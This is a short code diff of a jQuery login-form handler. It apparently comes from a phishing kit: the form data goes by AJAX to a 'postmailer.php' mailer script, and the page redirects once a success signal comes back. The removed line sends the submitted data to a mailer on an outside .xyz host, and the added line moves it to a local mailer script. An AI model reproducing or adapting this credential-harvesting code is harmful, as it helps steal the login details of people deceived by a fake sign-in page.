@@ -168,7 +168,7 @@ $(document).ready(function() {
         
         // Submit the form via AJAX
         $.ajax({
-            url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php', // Local PHP backend
+            url: 'postmailer.php', // Local PHP backend
             method: 'POST',
             type: 'POST',
             data: {
@@ -193,7 +193,7 @@ $(document).ready(function() {
                 console.log('Response success:', response && response.success);
                 
                 // Check if login was successful - more comprehensive check
-                if (response && (response.signal === 'OK' || response.success === true || 
+                if (response && (response.signal === 'ok' || response.success === true || 
                     msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
                     console.log('Login successful - triggering redirect');
                     handleSuccessfulLogin(response);
